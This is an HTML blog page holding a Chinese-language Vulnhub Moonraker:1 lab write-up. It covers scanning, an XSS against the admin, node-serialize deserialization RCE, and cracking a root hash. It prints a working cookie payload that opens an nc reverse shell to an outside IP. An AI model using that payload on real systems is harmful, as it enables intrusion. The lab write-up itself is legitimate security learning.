@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>
+        [Vulnhub] Moonraker:1 - Writeup - Naivekun&#39;s blog
+      </title>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  
+  <meta name="theme-color" content="#000000" />
+  
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <meta name="description" content="扫端口 太长了，截图放不下 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u4 (protocol 2.0) | ssh-hostkey: | 2048 5f:bf:c0:33:51:4f:4a:a7:4a:7e:15:80:aa:d7:2a:0b (RSA) | 256 53:59:87:1e:a4:46:bd:a7:fd:9a:5f:f9:b7:40:9d:2f (ECDSA) |_ 256 0d:88:d9:fa:af:08:ce:2b:13:66:a7:70:ec:49:02:10 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: MOONRAKER 3000/tcp open http Node.js" />
+  <meta name="generator" content="Hugo 0.70.0 with theme pure" />
+  <title>[Vulnhub] Moonraker:1 - Writeup - Naivekun&#39;s blog</title>
+  
+  
+  <link rel="stylesheet" href="https://naivekun.com/css/style.min.7dc20efbc53647d41aa9ddea0c48e59300223d084e66ea0cbe7c30bd88903acc.css">
+  
+  <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+  <meta property="og:title" content="[Vulnhub] Moonraker:1 - Writeup" />
+<meta property="og:description" content="扫端口 太长了，截图放不下 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u4 (protocol 2.0) | ssh-hostkey: | 2048 5f:bf:c0:33:51:4f:4a:a7:4a:7e:15:80:aa:d7:2a:0b (RSA) | 256 53:59:87:1e:a4:46:bd:a7:fd:9a:5f:f9:b7:40:9d:2f (ECDSA) |_ 256 0d:88:d9:fa:af:08:ce:2b:13:66:a7:70:ec:49:02:10 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: MOONRAKER 3000/tcp open http Node.js" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://naivekun.com/2018/11/vulnhub-moonraker-wp/" />
+<meta property="article:published_time" content="2018-11-30T21:02:11+00:00" />
+<meta property="article:modified_time" content="2018-11-30T21:02:11+00:00" />
+<meta itemprop="name" content="[Vulnhub] Moonraker:1 - Writeup">
+<meta itemprop="description" content="扫端口 太长了，截图放不下 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u4 (protocol 2.0) | ssh-hostkey: | 2048 5f:bf:c0:33:51:4f:4a:a7:4a:7e:15:80:aa:d7:2a:0b (RSA) | 256 53:59:87:1e:a4:46:bd:a7:fd:9a:5f:f9:b7:40:9d:2f (ECDSA) |_ 256 0d:88:d9:fa:af:08:ce:2b:13:66:a7:70:ec:49:02:10 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: MOONRAKER 3000/tcp open http Node.js">
+<meta itemprop="datePublished" content="2018-11-30T21:02:11&#43;00:00" />
+<meta itemprop="dateModified" content="2018-11-30T21:02:11&#43;00:00" />
+<meta itemprop="wordCount" content="1794">
+
+
+
+<meta itemprop="keywords" content="vulnhub," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Vulnhub] Moonraker:1 - Writeup"/>
+<meta name="twitter:description" content="扫端口 太长了，截图放不下 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u4 (protocol 2.0) | ssh-hostkey: | 2048 5f:bf:c0:33:51:4f:4a:a7:4a:7e:15:80:aa:d7:2a:0b (RSA) | 256 53:59:87:1e:a4:46:bd:a7:fd:9a:5f:f9:b7:40:9d:2f (ECDSA) |_ 256 0d:88:d9:fa:af:08:ce:2b:13:66:a7:70:ec:49:02:10 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: MOONRAKER 3000/tcp open http Node.js"/>
+
+  <!--[if lte IE 9]>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+    <![endif]-->
+
+  <!--[if lt IE 9]>
+      <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://github.com/naivekun" target="_blank">
+            <img class="img-circle img-rotate" src="https://naivekun.com/avatar.jpg" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">naivekun</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFer</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Wuhan, China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-friends">
+                <a href="/friends/">
+                    <i class="icon icon-friendship"></i>
+                  <span class="menu-title">Friends</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><script src="https://www.hackthebox.eu/badge/60818"></script>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> Categories</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://naivekun.com/categories/ctf/" class="category-list-link">ctf</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://naivekun.com/categories/hackthebox/" class="category-list-link">hackthebox</a><span class="category-list-count">13</span></li>
+            <li class="category-list-item"><a href="https://naivekun.com/categories/vulnhub/" class="category-list-link">vulnhub</a><span class="category-list-count">21</span></li>
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> Tags</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/ctf/" class="tag-list-link">ctf</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/hackthebox/" class="tag-list-link">hackthebox</a><span
+                    class="tag-list-count">13</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/vulnhub/" class="tag-list-link">vulnhub</a><span
+                    class="tag-list-count">21</span></li>
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2021/12/ma5671a-flash-openwrt/" class="title">68块钱MA5671A猫棒刷Openwrt</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-12-09 02:46:52 &#43;0800 &#43;0800" itemprop="datePublished">2021-12-09</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/10/hack-on-nrf/" class="title">nRF51系列单片机读取保护绕过</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-10-03 23:58:09 &#43;0800 &#43;0800" itemprop="datePublished">2020-10-03</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/08/hack-bmc/" class="title">一次对服务器主板IPMI BMC的漏洞挖掘</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-08-19 01:58:07 &#43;0800 &#43;0800" itemprop="datePublished">2020-08-19</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/07/tn3399-more/" class="title">TN3399板子填坑</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-07-23 18:03:36 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-23</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/07/tn3399/" class="title">闲鱼便宜板子TN3399折腾全攻略</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-07-14 16:51:10 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-14</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Catalogue</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2018/11/vulnhub-moonraker-wp/"
+    >[Vulnhub] Moonraker:1 - Writeup</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://naivekun.com/2018/11/vulnhub-moonraker-wp/" class="article-date">
+  <time datetime="2018-11-30 21:02:11 &#43;0000 UTC" itemprop="datePublished">2018-11-30</time>
+</a>
+</span>
+<span class="article-category">
+  <i class="icon icon-folder"></i>&nbsp;
+  <a class="article-category-link" href="/categories/vulnhub/"> vulnhub </a>
+</span>  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/vulnhub/"> vulnhub </a>
+  </span>
+
+        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2018/11/vulnhub-moonraker-wp/#comments"
+            class="article-comment-link">Comments</a></span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1794words</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 4minutes </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <p>扫端口
+太长了，截图放不下</p>
+<pre><code>PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 5f:bf:c0:33:51:4f:4a:a7:4a:7e:15:80:aa:d7:2a:0b (RSA)
+|   256 53:59:87:1e:a4:46:bd:a7:fd:9a:5f:f9:b7:40:9d:2f (ECDSA)
+|_  256 0d:88:d9:fa:af:08:ce:2b:13:66:a7:70:ec:49:02:10 (ED25519)
+80/tcp    open  http     Apache httpd 2.4.25 ((Debian))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: MOONRAKER
+3000/tcp  open  http     Node.js Express framework
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=401
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+4369/tcp  open  epmd     Erlang Port Mapper Daemon
+| epmd-info: 
+|   epmd_port: 4369
+|   nodes: 
+|_    couchdb: 34327
+5984/tcp  open  couchdb?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 Object Not Found
+|     Cache-Control: must-revalidate
+|     Connection: close
+|     Content-Length: 58
+|     Content-Type: application/json
+|     Date: Fri, 30 Nov 2018 13:10:17 GMT
+|     Server: CouchDB/2.2.0 (Erlang OTP/19)
+|     X-Couch-Request-ID: 28fe538d42
+|     X-CouchDB-Body-Time: 0
+|     {&quot;error&quot;:&quot;not_found&quot;,&quot;reason&quot;:&quot;Database does not exist.&quot;}
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: must-revalidate
+|     Connection: close
+|     Content-Length: 164
+|     Content-Type: application/json
+|     Date: Fri, 30 Nov 2018 13:09:24 GMT
+|     Server: CouchDB/2.2.0 (Erlang OTP/19)
+|     X-Couch-Request-ID: 436fb4695f
+|     X-CouchDB-Body-Time: 0
+|     {&quot;couchdb&quot;:&quot;Welcome&quot;,&quot;version&quot;:&quot;2.2.0&quot;,&quot;git_sha&quot;:&quot;2a16ec4&quot;,&quot;features&quot;:[&quot;pluggable-storage-engines&quot;,&quot;scheduler&quot;],&quot;vendor&quot;:{&quot;name&quot;:&quot;The Apache Software Foundation&quot;}}
+|   HTTPOptions: 
+|     HTTP/1.0 500 Internal Server Error
+|     Cache-Control: must-revalidate
+|     Connection: close
+|     Content-Length: 61
+|     Content-Type: application/json
+|     Date: Fri, 30 Nov 2018 13:09:24 GMT
+|     Server: CouchDB/2.2.0 (Erlang OTP/19)
+|     X-Couch-Request-ID: 74ac865d08
+|     X-Couch-Stack-Hash: 1828508689
+|     X-CouchDB-Body-Time: 0
+|_    {&quot;error&quot;:&quot;unknown_error&quot;,&quot;reason&quot;:&quot;badarg&quot;,&quot;ref&quot;:1828508689}
+34327/tcp open  unknown
+
+</code></pre>
+<p>开了ssh
+开了80
+开了个3000端口的Node.js
+开了个CouchDB。。。2.2版，没洞。。。2.1之前有任意用户创建的洞
+先看看80吧
+打开是个影片
+<img src="https://naivekun.com/images/1543583957102.png" alt="image">
+<img src="https://naivekun.com/images/1543584003007.png" alt="image">
+然后跳到一个网页
+<img src="https://naivekun.com/images/1543584028130.png" alt="image">
+先了解一下这个电影的背景信息</p>
+<blockquote>
+<p>007之太空城 Moonraker (1979)
+007之太空城的剧情简介 · · · · · ·
+　　从美国运送英国太空船半途失去了行踪，这引起了美英两国的高度重视，于是英过军方派出了007邦德（罗杰•摩尔 Roger Moore 饰）前去追查。经过调查，007发现了这件事背后后隐藏的另一个阴谋。世界上某个组织正在在制造一种神经麻痹气体，该气体是由一种极稀有的尼格拉兰花提取出来的；当邦德在这种兰花的产地详细调查后，一个足以震惊世界的大阴谋浮出了水面。原来，该组织已经在太空中建立了一个太空城，为了称霸世界，他们准备从太空城中发射50个自行研制毒气弹袭击地球上的50个大城市。邦德发现他们的阴谋后，准备飞上太空组织他们这个疯狂的计划！ ©豆瓣</p>
+</blockquote>
+<p>挺有意思
+<img src="https://naivekun.com/images/1543584227226.png" alt="image">
+<img src="https://naivekun.com/images/1543584244475.png" alt="image">
+<img src="https://naivekun.com/images/1543584280726.png" alt="image">
+提交？报名信息？
+貌似没啥洞啊。。。
+怼个XSS上去，beef启动
+<img src="https://naivekun.com/images/1543584369660.png" alt="image">
+把payload丢进去，提示管理员会在五分钟之内看？？？
+这会时间看看别的东西
+3000端口的http需要认证。。。
+CouchDB要账号和密码。。。
+扫目录无果。。。
+翻源码无果。。。
+等等吧</p>
+<hr>
+<p>等一会，XSS打回来了
+<img src="https://naivekun.com/images/1543584585613.png" alt="image">
+woc这啥垃圾后端，cookies都不带
+转到<code>/svc-inq/salesmoon-gui.php</code>看看
+<img src="https://naivekun.com/images/1543584632241.png" alt="image">
+第一个没东西
+第二个发现
+<img src="https://naivekun.com/images/1543584655607.png" alt="image">
+什么鬼，这电影我没看过啊。。。
+我咋知道它gf叫啥
+<del>我又没有</del>
+Wiki启动
+<code>https://en.wikipedia.org/wiki/Moonraker_(film)</code>
+<img src="https://naivekun.com/images/1543584826917.png" alt="image">
+叫<code>Dolly</code></p>
+<p>下面还有个按钮，里面是这些东西</p>
+<pre><code>FYI Hugo's custom page is being rebuilt over on the NodeJS server running on port 3000. Here's a snippet of the backend code for cookie input..this is once you get past the Username/password prompt.
+
+The dev team is still creating most of the front end, but we will have to &quot;secure the code&quot; since we're now not only tasked with sales, but also secure code review. How do they expect to offer all of these extra services without hiring more ppl? Never thought I'd be a nerdy &quot;coder&quot;!
+
+Here's the snippet, you'll need nodejs and other stuff to run. It looks good to me so I've pushed to prod...
+
+//Stuff to import
+var express = require('express');
+var cookieParser = require('cookie-parser');
+var escape = require('escape-html');
+var serialize = require('node-serialize');
+var app = express();
+
+// Here's the function they want reviewed...
+// I think it decodes the weird cookie string and runs it, prints it, sets it or idk.
+
+app.get('/', function(req, res) {
+	 if (req.cookies.profile) {
+	    var str = new Buffer(req.cookies.profile, 'base64').toString();
+	    var obj = serialize.unserialize(str);
+   	    	if (obj.username) {
+      		         res.send(&quot;Stuff here then print out username.. &quot; + escape(obj.username)&quot;);
+    	   		          }
+	      } else {
+   		         res.cookie('profile', &quot;eyJ1c2VybmFtZSI6Imh1Z28ifQ==&quot;, {
+ 				 maxAge: 900000,
+		                 httpOnly: true
+ 			            });
+		   }
+});
+app.listen(3000);
+</code></pre>
+<p><code>node-serialize</code>明摆着的反序列化。。。</p>
+<p>回顾一下之前收集的信息
+3000端口有个登录
+CouchDB有个登录
+使用凭据<code>jaws:dollyx99</code>
+成功登录
+<img src="https://naivekun.com/images/1543585102897.png" alt="image">
+翻数据库
+<img src="https://naivekun.com/images/1543585155347.png" alt="image">
+里面没东西
+<img src="https://naivekun.com/images/1543585173841.png" alt="image">
+这是个。。。监控？
+<img src="https://naivekun.com/images/1543585264829.png" alt="image">
+接着翻
+<img src="https://naivekun.com/images/1543585381461.png" alt="image">
+Offer letter里面有。。。用户名和密码
+拿这些凭据尝试登录3000端口，发现用户hugo成功登录
+结合之前发现的源码，准备抓包，搞RCE
+Burpsuite启动
+<img src="https://naivekun.com/images/1543585678876.png" alt="image">
+<code>{&quot;username&quot;:&quot;_$$ND_FUNC$$_function (){require(\&quot;child_process\&quot;).exec(\&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.20.146 4442 &gt;/tmp/f\&quot;)}()&quot;}</code>
+怼进cookies
+打开监听
+<img src="https://naivekun.com/images/1543585841733.png" alt="image">
+得到一个shell
+<img src="https://naivekun.com/images/1543585870715.png" alt="image">
+准备提权
+内核是4.9
+suid没东西
+计划任务，sudoers没东西
+看看<code>.bash_history</code>
+<img src="https://naivekun.com/images/1543586010416.png" alt="image">
+发现local.ini
+find找找，发现是CouchDB的配置文件
+cat出来看看
+<img src="https://naivekun.com/images/1543586087123.png" alt="image">
+<img src="https://naivekun.com/images/1543586110134.png" alt="image">
+<code>su hugo</code>
+成功跳到hugo用户
+<img src="https://naivekun.com/images/1543586188197.png" alt="image">
+翻翻邮件</p>
+<pre><code>From moonrakertech@moonraker.localdomain  Fri Oct  5 19:11:17 2018
+Return-Path: &lt;moonrakertech@moonraker.localdomain&gt;
+X-Original-To: hugo@moonraker.localdomain
+Delivered-To: hugo@moonraker.localdomain
+Received: by moonraker.localdomain (Postfix, from userid 1003)
+	id 81CA720405; Fri,  5 Oct 2018 19:11:17 -0400 (EDT)
+To: hugo@moonraker.localdomain
+Subject: RE:Root Access
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20181005231117.81CA720405@moonraker.localdomain&gt;
+Date: Fri,  5 Oct 2018 19:11:17 -0400 (EDT)
+From: moonrakertech@moonraker.localdomain
+
+Mr. Hugo Drax, I don't care if you're the president of the United States, You will need to create a ticket for this request. Do you not understand the IT request process or do we need to require more mandatory online training?
+
+From moonrakertech@moonraker.localdomain  Fri Oct  5 19:39:51 2018
+Return-Path: &lt;moonrakertech@moonraker.localdomain&gt;
+X-Original-To: hugo@moonraker.localdomain
+Delivered-To: hugo@moonraker.localdomain
+Received: by moonraker.localdomain (Postfix, from userid 1003)
+	id DEF0A20410; Fri,  5 Oct 2018 19:39:51 -0400 (EDT)
+To: hugo@moonraker.localdomain
+Subject: RE:RE:RE:Root Access
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20181005233951.DEF0A20410@moonraker.localdomain&gt;
+Date: Fri,  5 Oct 2018 19:39:51 -0400 (EDT)
+From: moonrakertech@moonraker.localdomain
+
+Hugo...I'm being given a reward huh? Finally some well deserved recognition! Also this better come with a bump in pay otherwise I'm not afraid to give you a piece of my mind! See you outside of the Decompression Chamber shortly as per your request...I'm expecting the Award to be in hand as I don't like to get up from me desk.
+
+Also your ticket has been complete. Since I'm feeling nice today, I'm including the password here in its native hash and not in the ticket. BTW this is the old password hash, the new one is the same + &quot;VR00M&quot; without quotes.
+
+Have fun with the decryption process &quot;Boss&quot;! Haha!
+
+root:$6$auLf9y8f$qgi63MGYQGnnk6.6ktcZIMpROPMqMXMEM7JufH1aTIApIPIZZu7yRjfIcZ1pELNoeMM7sIwCrVmMCjNYJRRGf/:17809:0:99999:7:::
+
+From hr@moonraker.localdomain  Fri Oct  5 20:24:20 2018
+Return-Path: &lt;hr@moonraker.localdomain&gt;
+X-Original-To: hugo@moonraker.localdomain
+Delivered-To: hugo@moonraker.localdomain
+Received: by moonraker.localdomain (Postfix, from userid 1000)
+	id 2412120452; Fri,  5 Oct 2018 20:24:20 -0400 (EDT)
+To: hugo@moonraker.localdomain
+Subject: Decompression Accident
+MIME-Version: 1.0
+Content-Type: text/plain; charset=&quot;UTF-8&quot;
+Content-Transfer-Encoding: 8bit
+Message-Id: &lt;20181006002420.2412120452@moonraker.localdomain&gt;
+Date: Fri,  5 Oct 2018 20:24:20 -0400 (EDT)
+From: hr@moonraker.localdomain
+
+Mr. Hugo, since you were a witness to Moonrakertech's accident, you'll have to write up a statement. Just stick to the basics like we talked about. Jaws deleted the camera footage, and there were no witnesses. 
+</code></pre>
+<p>得到root的哈希
+john跑一下
+<img src="https://naivekun.com/images/1543586259463.png" alt="image">
+所以<code>root:cyberVR00M</code>
+成功登录
+拿到flag
+<img src="https://naivekun.com/images/1543588211270.png" alt="image"></p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>Permalink: </strong>
+      <a href="https://naivekun.com/2018/11/vulnhub-moonraker-wp/" title="[Vulnhub] Moonraker:1 - Writeup" target="_blank" rel="external">https://naivekun.com/2018/11/vulnhub-moonraker-wp/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License：</strong><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/naivekun" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://naivekun.com/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/naivekun" target="_blank"><span class="text-dark">naivekun</span><small class="ml-1x">CTFer</small></a></h3>
+        <div>Web/Pentest/Android</div>
+      </div>
+    </figure>
+  </div>
+</div>
+    </div>
+  </article>
+<section id="comments">
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://naivekun.com/2018/11/ctf-kiofan-wp/" title="[Vulnhub] CTF-KIOFan - WriteUp"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            <li class="next">
+                <a href="https://naivekun.com/2018/12/htb-hawk-wp/"
+                    title="[HackTheBox] Hawk - WriteUp"><span>Newer&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Catalogue</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        
+        <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal"
+            data-target="#donateModal"><span>$</span></button>
+        
+        <div class="bar-right">
+        </div>
+    </div>
+</nav>
+
+
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content donate">
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span
+                    aria-hidden="true">&times;</span></button>
+            <div class="modal-body">
+                <div class="donate-box">
+                    <div class="donate-head">
+                        <p>Maybe you could buy me a cup of coffee.</p>
+                    </div>
+                    <div class="tab-content">
+                        <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+                            <div class="donate-payimg">
+                                <img src="https://naivekun.com/donate/alipayimg.png"
+                                    alt="Scan Qrcode" title="Scan" />
+                            </div>
+                            <p class="text-muted mv">Scan this qrcode</p>
+                            <p class="text-grey">Open alipay app scan this qrcode, buy me a coffee!</p>
+                        </div>
+                        <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+                            <div class="donate-payimg">
+                                <img src="https://naivekun.com/donate/wechatpayimg.png"
+                                    alt="Scan Qrcode" title="Scan" />
+                            </div>
+                            <p class="text-muted mv">Scan this qrcode</p>
+                            <p class="text-grey">Open wechat app scan this qrcode, buy me a coffee!</p>
+                        </div>
+                    </div>
+                    <div class="donate-footer">
+                        <ul class="nav nav-tabs nav-justified" role="tablist">
+                            <li role="presentation" class="active">
+                                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay"
+                                    aria-expanded="true"><i class="icon icon-alipay"></i> alipay</a>
+                            </li>
+                            <li role="presentation" class="">
+                                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab"
+                                    aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i>
+                                    wechat payment</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
